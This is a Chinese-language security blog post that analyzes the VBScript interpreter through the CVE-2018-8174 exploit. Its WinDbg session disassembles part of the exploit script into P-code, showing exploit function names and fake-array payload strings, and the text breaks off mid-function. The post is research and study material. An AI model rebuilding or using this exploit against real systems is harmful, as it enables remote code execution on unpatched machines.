<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  

  
    
      
    

    
  

  
    
    
    <link href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="ArbitraryWrite">










<meta name="description" content="0x00 &amp;#x524D;&amp;#x8A00;&amp;#x4E0A;&amp;#x4E00;&amp;#x7BC7;&amp;#x5728;8174&amp;#x4E2D;&amp;#xFF0C;&amp;#x5C3D;&amp;#x7BA1;&amp;#x901A;&amp;#x8FC7;windbg&amp;#x548C;&amp;#x6E90;&amp;#x7801;&amp;#x5206;&amp;#x6790;&amp;#x4E2D;&amp;#xFF0C;&amp;#x6211;&amp;#x4EEC;&amp;#x5927;&amp;#x81F4;&amp;">
<meta name="keywords" content="ArbitraryWrite">
<meta property="og:type" content="article">
<meta property="og:title" content="从cve-2018-8174到VBScript解释器的内部结构">
<meta property="og:url" content="https://saturn35.github.io/2019/08/13/20190813-1/index.html">
<meta property="og:site_name" content="Saturn35">
<meta property="og:description" content="0x00 &amp;#x524D;&amp;#x8A00;&amp;#x4E0A;&amp;#x4E00;&amp;#x7BC7;&amp;#x5728;8174&amp;#x4E2D;&amp;#xFF0C;&amp;#x5C3D;&amp;#x7BA1;&amp;#x901A;&amp;#x8FC7;windbg&amp;#x548C;&amp;#x6E90;&amp;#x7801;&amp;#x5206;&amp;#x6790;&amp;#x4E2D;&amp;#xFF0C;&amp;#x6211;&amp;#x4EEC;&amp;#x5927;&amp;#x81F4;&amp;">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://saturn35.github.io/2019/08/13/20190813-1/1.jpg">
<meta property="og:image" content="https://saturn35.github.io/2019/08/13/20190813-1/2.jpg">
<meta property="og:image" content="https://saturn35.github.io/2019/08/13/20190813-1/3.png">
<meta property="og:image" content="https://saturn35.github.io/2019/08/13/20190813-1/4.png">
<meta property="og:image" content="https://saturn35.github.io/2019/08/13/20190813-1/5.png">
<meta property="og:updated_time" content="2019-12-28T05:22:44.037Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="从cve-2018-8174到VBScript解释器的内部结构">
<meta name="twitter:description" content="0x00 &amp;#x524D;&amp;#x8A00;&amp;#x4E0A;&amp;#x4E00;&amp;#x7BC7;&amp;#x5728;8174&amp;#x4E2D;&amp;#xFF0C;&amp;#x5C3D;&amp;#x7BA1;&amp;#x901A;&amp;#x8FC7;windbg&amp;#x548C;&amp;#x6E90;&amp;#x7801;&amp;#x5206;&amp;#x6790;&amp;#x4E2D;&amp;#xFF0C;&amp;#x6211;&amp;#x4EEC;&amp;#x5927;&amp;#x81F4;&amp;">
<meta name="twitter:image" content="https://saturn35.github.io/2019/08/13/20190813-1/1.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://saturn35.github.io/2019/08/13/20190813-1/">






  <title>从cve-2018-8174到VBScript解释器的内部结构 | Saturn35</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Saturn35</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>




 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://saturn35.github.io/2019/08/13/20190813-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Saturn35">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/head.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Saturn35">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">从cve-2018-8174到VBScript解释器的内部结构</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-13T17:22:25+08:00">
                2019-08-13
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/08/13/20190813-1/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/08/13/20190813-1/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4,016
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  21
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h4 id="0x00-&#x524D;&#x8A00;"><a href="#0x00-&#x524D;&#x8A00;" class="headerlink" title="0x00 &#x524D;&#x8A00;"></a><strong>0x00 &#x524D;&#x8A00;</strong></h4><p>&#x4E0A;&#x4E00;&#x7BC7;&#x5728;8174&#x4E2D;&#xFF0C;&#x5C3D;&#x7BA1;&#x901A;&#x8FC7;windbg&#x548C;&#x6E90;&#x7801;&#x5206;&#x6790;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5927;&#x81F4;&#x4E86;&#x89E3;&#x4E86;&#x6F0F;&#x6D1E;&#x539F;&#x7406;&#x53CA;&#x5176;&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x7EC6;&#x60F3;&#x8D77;&#x6765;&#xFF0C;&#x5BF9;Vbscript&#x89E3;&#x91CA;&#x5668;&#x5728;&#x7C7B;&#x53CA;&#x5176;&#x5BF9;&#x8C61;&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x662F;&#x975E;&#x5E38;&#x964C;&#x751F;&#x7684;&#xFF0C;&#x4EE5;&#x81F3;&#x4E8E;&#x8FC7;&#x4E86;&#x51E0;&#x5929;&#xFF0C;&#x60F3;&#x4E0D;&#x8D77;&#x6765;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x4EE5;&#x53CA;&#x5206;&#x6790;&#x8FC7;&#x7A0B;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x5BF9;Vbs&#x7684;&#x89E3;&#x6790;&#x5668;&#x5185;&#x90E8;&#x8FC7;&#x7A0B;&#x8FDB;&#x884C;&#x5206;&#x6790;&#x3002;</p>
<p>&#x4F20;&#x9001;&#x95E8;&#xFF1A;</p>
<p><a href="https://yan-1-20.github.io/2016/08/22/2016/8/22/" target="_blank" rel="noopener">[+]windbg&#x7684;py&#x6269;&#x5C55;&#x53C2;&#x8003;</a></p>
<h4 id="0x01-&#x6982;&#x5FF5;"><a href="#0x01-&#x6982;&#x5FF5;" class="headerlink" title="0x01 &#x6982;&#x5FF5;"></a><strong>0x01 &#x6982;&#x5FF5;</strong></h4><p>&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;&#x91C7;&#x7528;VB&#x7F16;&#x5199;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6709;&#x4E24;&#x79CD;&#x7F16;&#x8BD1;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x79CD;&#x662F;Native Code&#x65B9;&#x5F0F;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x5C31;&#x662F;P-code&#x65B9;&#x5F0F;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;VB 4.0&#x4EE5;&#x524D;&#x53EA;&#x91C7;&#x7528;P-code&#x7F16;&#x8BD1;&#xFF0C;VB Native Code&#x662F;&#x5728;VB 5.0&#x4EE5;&#x540E;&#x53D1;&#x5C55;&#x8D77;&#x6765;&#x7684;&#xFF0C;&#x5176;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x6539;&#x5584;VB&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;&#x901F;&#x5EA6;&#x3002;VB P-code&#x7684;&#x8FD0;&#x884C;&#x901F;&#x5EA6;&#x8F83;&#x6162;&#xFF0C;&#x8FD9;&#x662F;&#x7531;&#x5B83;&#x672C;&#x8EAB;&#x7684;&#x8FD0;&#x884C;&#x673A;&#x5236;&#x6240;&#x51B3;&#x5B9A;&#x7684;&#x3002;</p>
<p>P-code&#xFF0C;&#x5373;Pseudo Code&#xFF08;&#x4F2A;&#x4EE3;&#x7801;&#xFF09;&#xFF0C;&#x8FD9;&#x4E00;&#x6982;&#x5FF5;&#x6700;&#x65E9;&#x51FA;&#x73B0;&#x5728;Pascal&#x7F16;&#x8BD1;&#x5668;&#x4E2D;&#xFF0C;&#x5B83;&#x662F;&#x4E3A;&#x4E86;&#x63D0;&#x4F9B;&#x8DE8;&#x5E73;&#x53F0;&#x53EF;&#x79FB;&#x690D;&#x6027;&#x800C;&#x4EA7;&#x751F;&#x7684;&#xFF0C;&#x5B9E;&#x73B0;&#x8FD9;&#x4E00;&#x7F16;&#x8BD1;&#x673A;&#x5236;&#x7684;Pascal&#x7F16;&#x8BD1;&#x5668;&#x88AB;&#x79F0;&#x4E3A;&#x201D;Pascal P Compiler&#x201D;&#x3002;Sun&#x516C;&#x53F8;&#x5728;&#x5176;&#x63A8;&#x51FA;&#x7684;Java&#x8BED;&#x8A00;&#x4E0A;&#x4E5F;&#x6210;&#x529F;&#x5730;&#x5B9E;&#x73B0;&#x4E86;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#x3002;Java&#x7A0B;&#x5E8F;&#x7684;&#x4F2A;&#x7F16;&#x8BD1;&#x4EE3;&#x7801;&#x7531;&#x4E00;&#x7CFB;&#x5217;&#x4EE3;&#x8868;&#x4E00;&#x5B9A;&#x610F;&#x4E49;&#x7684;&#x5B57;&#x8282;&#x7801;(byte code)&#x7EC4;&#x6210;&#xFF0C;&#x5B83;&#x4EEC;&#x540C;&#x5C5E;&#x4E8E;&#x4E00;&#x5957;&#x7279;&#x5B9A;&#x7684;&#x6307;&#x4EE4;&#x96C6;&#xFF0C;&#x8FD9;&#x79CD;&#x5B57;&#x8282;&#x7801;&#x4E0D;&#x80FD;&#x7531;&#x4E0D;&#x540C;&#x7684;CPU&#x76F4;&#x63A5;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x662F;&#x8981;&#x901A;&#x8FC7;&#x7279;&#x6B8A;&#x7684;&#x89E3;&#x91CA;&#x5668;&#x7FFB;&#x8BD1;&#x4E3A;CPU&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x7684;&#x6307;&#x4EE4;&#x624D;&#x80FD;&#x6267;&#x884C;&#xFF0C;&#x8FD9;&#x79CD;&#x89E3;&#x91CA;&#x5668;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x8BF4;&#x7684;&#x201D;&#x865A;&#x62DF;&#x673A;&#x201D;&#x3002;</p>
<p>&#x53EA;&#x8981;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x5E73;&#x53F0;&#x4E0A;&#x63D0;&#x4F9B;&#x865A;&#x62DF;&#x673A;&#xFF0C;&#x628A;&#x5B57;&#x8282;&#x7801;&#x7FFB;&#x8BD1;&#x4E3A;&#x5BF9;&#x5E94;&#x7684;CPU&#x6307;&#x4EE4;&#x96C6;&#xFF0C;&#x4E5F;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x6240;&#x8C13;&#x7684;&#x8DE8;&#x5E73;&#x53F0;&#x7279;&#x6027;&#x3002;Microsoft&#x63A8;&#x51FA;&#x7684;VB P-code&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x4E5F;&#x662F;&#x4E00;&#x7EC4;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6307;&#x4EE4;&#x96C6;&#xFF0C;&#x5FC5;&#x987B;&#x901A;&#x8FC7;&#x57FA;&#x4E8E;&#x5806;&#x6808;&#x7684;&#x865A;&#x62DF;&#x673A;&#x7FFB;&#x8BD1;&#x4E3A;80X86&#x4E0A;&#x7684;&#x6307;&#x4EE4;&#x96C6;&#x624D;&#x80FD;&#x6267;&#x884C;&#xFF0C;&#x62C5;&#x4EFB;&#x865A;&#x62DF;&#x673A;&#x4EFB;&#x52A1;&#x7684;&#x5C31;&#x662F;msvbvm50.dll&#x548C;msvbvm60.dll&#x8FD9;&#x4E24;&#x4E2A;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#x6587;&#x4EF6;&#x3002;&#x7531;&#x4E8E;&#x5728;&#x6587;&#x4EF6;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x591A;&#x51FA;&#x4E86;&#x8FD9;&#x4E00;&#x4E2A;&#x89E3;&#x91CA;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x81EA;&#x7136;&#x8981;&#x5F71;&#x54CD;&#x5230;&#x5176;&#x6267;&#x884C;&#x7684;&#x901F;&#x5EA6;&#x3002;&#x6B63;&#x5982;&#x6211;&#x4EEC;&#x6240;&#x770B;&#x5230;&#x7684;&#xFF0C;VB P-code&#x5E76;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;&#x6240;&#x8C13;&#x7684;&#x8DE8;&#x5E73;&#x53F0;&#x8FD0;&#x884C;&#x7279;&#x6027;&#xFF0C;&#x8FD9;&#x5BF9;&#x4E8E;Pseudo&#x8FD9;&#x4E2A;&#x8BCD;&#x7684;&#x8D77;&#x6E90;&#x662F;&#x4E0D;&#x6070;&#x5F53;&#x7684;&#xFF1B;&#x53E6;&#x4E00;&#x65B9;&#x9762;&#xFF0C;&#x91C7;&#x7528;P-code&#x5F62;&#x5F0F;&#x7F16;&#x8BD1;&#x7684;VB&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x4F53;&#x79EF;&#x8981;&#x5C0F;&#x4E8E;&#x91C7;&#x7528;Native Code&#x5F62;&#x5F0F;&#x7F16;&#x8BD1;&#x7684;&#x540C;&#x6837;&#x7A0B;&#x5E8F;&#xFF08;&#x8FD9;&#x662F;&#x7531;&#x4E8E;P-code&#x6307;&#x4EE4;&#x96C6;&#x7684;&#x6BCF;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x5BF9;&#x5E94;&#x4E8E;&#x4E00;&#x7EC4;80X86&#x6307;&#x4EE4;&#x6240;&#x5B8C;&#x6210;&#x7684;&#x4EFB;&#x52A1;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;VB P-code&#x5B9E;&#x9645;&#x4E0A;&#x610F;&#x5473;&#x7740;VB Packed-code&#xFF08;&#x538B;&#x7F29;&#x4EE3;&#x7801;&#xFF09;&#xFF0C;&#x7528;&#x4EE5;&#x5F3A;&#x8C03;VB P-code&#x7A0B;&#x5E8F;&#x8F83;&#x5C0F;&#x7684;&#x4EE3;&#x7801;&#x4F53;&#x79EF;&#x3002;</p>
<p>vbs&#x5F15;&#x64CE;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x5927;&#x81F4;&#x6D41;&#x7A0B;&#x662F;&#x5148;&#x5C06;&#x811A;&#x672C;&#x5185;&#x5BB9;&#x89E3;&#x6790;&#x6210;&#x76F8;&#x5E94;&#x7684;opcode&#x5B57;&#x8282;&#x7801;&#xFF08;&#x8BE5;&#x5B57;&#x8282;&#x7801;&#x53EF;&#x4EE5;&#x89E3;&#x6790;&#x6210;P-code&#xFF08;&#x7C7B;&#x4F3C;&#x4E8E;&#x4E8C;&#x8FDB;&#x5236;PE&#x6587;&#x4EF6;&#x7684;&#x53CD;&#x6C47;&#x7F16;&#xFF09;&#x4FBF;&#x4E8E;&#x8C03;&#x8BD5;&#x4EBA;&#x5458;&#x9759;&#x6001;&#x5206;&#x6790;&#x5176;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x865A;&#x62DF;&#x673A;&#x4E2D;&#x7684;CScriptRuntime&#x7C7B;&#x5C06;&#x4F1A;&#x63A5;&#x7BA1;&#x8FD9;&#x4E9B;&#x5B57;&#x8282;&#x7801;&#x5E76;&#x57FA;&#x4E8E;&#x7279;&#x5B9A;&#x7684;&#x5806;&#x6808;&#x89C4;&#x5219;&#x5F00;&#x59CB;&#x89E3;&#x91CA;&#x6267;&#x884C;&#x3002;&#x901A;&#x8FC7;&#x7814;&#x7A76;&#x76F8;&#x5E94;&#x7684;P-code&#x4EE3;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x6211;&#x4EEC;&#x66F4;&#x76F4;&#x89C2;&#x5730;&#x53BB;&#x7406;&#x89E3;vbs&#x865A;&#x62DF;&#x673A;&#x7684;&#x4E00;&#x4E9B;&#x673A;&#x5236;&#x3002;</p>
<h4 id="0x02-8174&#x7684;p-code&#x4EE3;&#x7801;&#x53CA;&#x5206;&#x6790;"><a href="#0x02-8174&#x7684;p-code&#x4EE3;&#x7801;&#x53CA;&#x5206;&#x6790;" class="headerlink" title="0x02 8174&#x7684;p-code&#x4EE3;&#x7801;&#x53CA;&#x5206;&#x6790;"></a><strong>0x02 8174&#x7684;p-code&#x4EE3;&#x7801;&#x53CA;&#x5206;&#x6790;</strong></h4><pre><code>0:000&gt; sxe ld:Vbscript
0:000&gt; g
eax=00000000 ebx=00000000 ecx=00000074 edx=00437a48 esi=7ffd9000 edi=01f2c1ec
eip=77b970b4 esp=01f2c104 ebp=01f2c158 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiFastSystemCallRet:
77b970b4 c3              ret
2:036&gt; ld vbscript
Symbols loaded for vbscript
2:036&gt; bp CScriptRuntime::RunNoEH
2:036&gt; bl
     0 e Disable Clear  6aa427fe     0001 (0001)  2:**** vbscript!CScriptRuntime::RunNoEH
2:036&gt; g
Breakpoint 0 hit
eax=01f2d2f0 ebx=01f2d43c ecx=01f2d32c edx=00000000 esi=01f2d32c edi=01f2d43c
eip=6aa427fe esp=01f2d2d8 ebp=01f2d31c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
vbscript!CScriptRuntime::RunNoEH:
6aa427fe 8bff            mov     edi,edi
2:036&gt; !load pykd.pyd //
2:036&gt; !py C:\Users\xutianyao\Desktop\VBscriptInternals-master\kl_vbs_disasm_windbg.py
    Global code [max stack = 2]:
        tmp count = 14
    Pcode:
        027E4DA8 - 0000    OP_FnBind        &apos;tostring&apos; 1 FALSE
        027E4DB2 - 000A    OP_FnBind        &apos;addr2str&apos; 2 FALSE
        027E4DBC - 0014    OP_FnBind        &apos;make_ntcontinue_bytes&apos; 3 FALSE
        027E4DC6 - 001E    OP_FnBind        &apos;make_virtualprotect_bytes&apos; 4 FALSE
        027E4DD0 - 0028    OP_FnBind        &apos;make_final_bytes&apos; 5 FALSE
        027E4DDA - 0032    OP_FnBind        &apos;trigger_var_clear&apos; 6 FALSE
        027E4DE4 - 003C    OP_FnBind        &apos;shellcode&apos; 7 FALSE
        027E4DEE - 0046    OP_FnBind        &apos;GetUint32&apos; 8 FALSE
        027E4DF8 - 0050    OP_FnBind        &apos;read_unit32_low_four&apos; 9 FALSE
        027E4E02 - 005A    OP_FnBind        &apos;read_unit32_low_two&apos; 10 FALSE
        027E4E0C - 0064    OP_FnBind        &apos;cmp_str&apos; 11 FALSE
        027E4E16 - 006E    OP_FnBind        &apos;GetBaseAddrByPoiAddr&apos; 12 FALSE
        027E4E20 - 0078    OP_FnBind        &apos;GetModuleFromImport&apos; 13 FALSE
        027E4E2A - 0082    OP_FnBind        &apos;GetProcAddress&apos; 14 FALSE
        027E4E34 - 008C    OP_FnBind        &apos;read_longint&apos; 15 FALSE
        027E4E3E - 0096    OP_FnBind        &apos;set_need_longint&apos; 16 FALSE
        027E4E48 - 00A0    OP_FnBind        &apos;EmptyFunc&apos; 17 FALSE
        027E4E52 - 00AA    OP_FnBind        &apos;exp_c&apos; 18 FALSE
        027E4E5C - 00B4    OP_FnBind        &apos;exp_a&apos; 19 FALSE
        027E4E66 - 00BE    OP_FnBind        &apos;exp_b&apos; 20 FALSE
        027E4E70 - 00C8    OP_FnBind        &apos;StartExploit&apos; 21 FALSE
        027E4E7A - 00D2    OP_FnBind        &apos;class_getp_b&apos; 22 TRUE
        027E4E84 - 00DC    OP_FnBind        &apos;class_getp_a&apos; 24 TRUE
        027E4E8E - 00E6    OP_FnBind        &apos;class_fun_a&apos; 26 TRUE
        027E4E98 - 00F0    OP_FnBind        &apos;class_setprop_a&apos; 29 TRUE
        027E4EA2 - 00FA    OP_FnBind        &apos;empty_class&apos; 32 TRUE
        027E4EAC - 0104    OP_FnBind        &apos;class_ter_b&apos; 33 TRUE
        027E4EB6 - 010E    OP_FnBind        &apos;class_ter_a&apos; 35 TRUE
        027E4EC0 - 0118    OP_VarBind       &apos;ab&apos; 1 FALSE
        027E4EC8 - 0120    OP_VarBind       &apos;wild_ref_arr_a&apos; 2 FALSE
        027E4ED0 - 0128    OP_VarBind       &apos;wild_ref_arr_b&apos; 3 FALSE
        027E4ED8 - 0130    OP_VarBind       &apos;idx&apos; 4 FALSE
        027E4EE0 - 0138    OP_VarBind       &apos;aa&apos; 5 FALSE
        027E4EE8 - 0140    OP_VarBind       &apos;fake_array&apos; 6 FALSE
        027E4EF0 - 0148    OP_VarBind       &apos;fake_str&apos; 7 FALSE
        027E4EF8 - 0150    OP_VarBind       &apos;rw_var&apos; 8 FALSE
        027E4F00 - 0158    OP_VarBind       &apos;setprop_a_1&apos; 9 FALSE
        027E4F08 - 0160    OP_VarBind       &apos;setprop_a_2&apos; 10 FALSE
        027E4F10 - 0168    OP_VarBind       &apos;getp_a&apos; 11 FALSE
        027E4F18 - 0170    OP_VarBind       &apos;getp_b&apos; 12 FALSE
        027E4F20 - 0178    OP_VarBind       &apos;api_NtContinue&apos; 13 FALSE
        027E4F28 - 0180    OP_VarBind       &apos;api_VirtualProtect&apos; 14 FALSE
        ***BOS(12,52)*** Dim wild_ref_arr_a(6), wild_ref_arr_b(6) *****
        027E4F30 - 0188    OP_Bos1          0
        027E4F32 - 018A    OP_IntConst      6
        027E4F34 - 018C    OP_ArrLclDim     2 1
        027E4F39 - 0191    OP_IntConst      6
        027E4F3B - 0193    OP_ArrLclDim     3 1
        ***BOS(63,73)*** Dim aa(40) *****
        027E4F40 - 0198    OP_Bos1          1
        027E4F42 - 019A    OP_IntConst      40
        027E4F44 - 019C    OP_ArrLclDim     5 1
        ***BOS(203,221)*** rw_var = 195948557 *****
        027E4F49 - 01A1    OP_Bos1          2
        027E4F4B - 01A3    OP_LngConst      195948557
        027E4F50 - 01A8    OP_LocalSt       8
        ***BOS(225,240)*** idx = 195890093 *****
        027E4F53 - 01AB    OP_Bos1          3
        027E4F55 - 01AD    OP_LngConst      195890093
        027E4F5A - 01B2    OP_LocalSt       4
        ***BOS(244,341)*** fake_array = Unescape(&quot;%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000&quot;) *****
        027E4F5D - 01B5    OP_Bos1          4
        027E4F5F - 01B7    OP_StrConst      &apos;%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000&apos;
        027E4F64 - 01BC    OP_CallNmdAdr    &apos;Unescape&apos; 1
        027E4F6B - 01C3    OP_LocalSt       6
        ***BOS(343,416)*** fake_str   = Unescape(&quot;%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000&quot;) *****
        027E4F6E - 01C6    OP_Bos1          5
        027E4F70 - 01C8    OP_StrConst      &apos;%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000&apos;
        027E4F75 - 01CD    OP_CallNmdAdr    &apos;Unescape&apos; 1
        027E4F7C - 01D4    OP_LocalSt       7
        ***BOS(8257,8286)*** Set getp_a = New class_getp_a *****
        027E4F7F - 01D7    OP_Bos1          6
        027E4F81 - 01D9    OP_InitClass     &apos;class_getp_a&apos;
        027E4F86 - 01DE    OP_LocalSet      11
        ***BOS(8288,8317)*** Set getp_b = New class_getp_b *****
        027E4F89 - 01E1    OP_Bos1          7
        027E4F8B - 01E3    OP_InitClass     &apos;class_getp_b&apos;
        027E4F90 - 01E8    OP_LocalSet      12
        ***BOS(10047,10059)*** StartExploit *****
        027E4F93 - 01EB    OP_Bos1          8
        027E4F95 - 01ED    OP_CallNmdVoid   &apos;StartExploit&apos; 0
        027E4F9C - 01F4    OP_Bos0         
        027E4F9D - 01F5    OP_FuncEnd      
Function 1 (&apos;tostring&apos;) [max stack = 3]://&#x51FD;&#x6570;1 tostring
    arg count = 2
        arg  -1 = val Variant    &apos;Number&apos;
        arg  -2 = val Variant    &apos;Length&apos;
    lcl count = 0
Pcode:
    ***BOS(470,487)*** str = Hex(Number) *****
    027E4FE0 - 0000    OP_Bos1          0
    027E4FE2 - 0002    OP_LocalAdr      -1
    027E4FE5 - 0005    OP_CallNmdAdr    &apos;Hex&apos; 1
    027E4FEC - 000C    OP_NamedSt       &apos;str&apos;
    ***BOS(490,515)*** If Len(str) &lt; Length Then *****
    027E4FF1 - 0011    OP_Bos1          1
    027E4FF3 - 0013    OP_NamedAdr      &apos;str&apos;
    027E4FF8 - 0018    OP_CallNmdAdr    &apos;Len&apos; 1
    027E4FFF - 001F    OP_LocalAdr      -2
    027E5002 - 0022    OP_LT           
    027E5003 - 0023    OP_JccFalse      0057
    ***BOS(519,560)*** str = String(Length - Len(str), &quot;0&quot;) &amp;str *****
    027E5008 - 0028    OP_Bos1          2
    027E500A - 002A    OP_LocalAdr      -2
    027E500D - 002D    OP_NamedAdr      &apos;str&apos;
    027E5012 - 0032    OP_CallNmdAdr    &apos;Len&apos; 1
    027E5019 - 0039    OP_Sub          
    027E501A - 003A    OP_StrConst      &apos;0&apos;
    027E501F - 003F    OP_CallNmdAdr    &apos;String&apos; 2
    027E5026 - 0046    OP_NamedAdr      &apos;str&apos;
    027E502B - 004B    OP_Conc         
